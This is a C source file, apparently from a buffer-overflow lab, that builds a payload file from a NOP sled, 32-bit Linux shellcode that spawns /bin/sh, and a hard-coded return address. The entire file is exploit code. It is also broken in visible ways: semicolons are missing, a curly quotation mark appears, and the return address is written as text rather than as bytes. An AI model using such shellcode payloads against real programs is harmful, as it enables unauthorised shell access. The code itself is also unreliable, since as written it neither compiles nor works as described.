/* attack.c */
/* A program that creates a file containing code for launching shell. */
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#define NOP 0x90
char shellcode[]=
    "\x31\xc0" 
    "\x50" 
    "\x68""//sh" 
    "\x68""/bin" 
    "\x89\xe3" 
    "\x50" 
    "\x53" 
    "\x89\xe1" 
    "\x99" 
    "\xb0\x0b" 
    "\xcd\x80" 
void main(int argc, char *argv[]) {
    char buff[320];
    FILE *badfile;

    memset(&buff,0x90, 320)

    int bsize = sizeof(buff);
    strcpy(buff+56, “0xbffff694");
    strcpy(buff+20, shellcode);


    badfile = fopen("./badfile", "w");
    fwrite(buff, bsize, 1, badfile);
    fclose(badfile);
}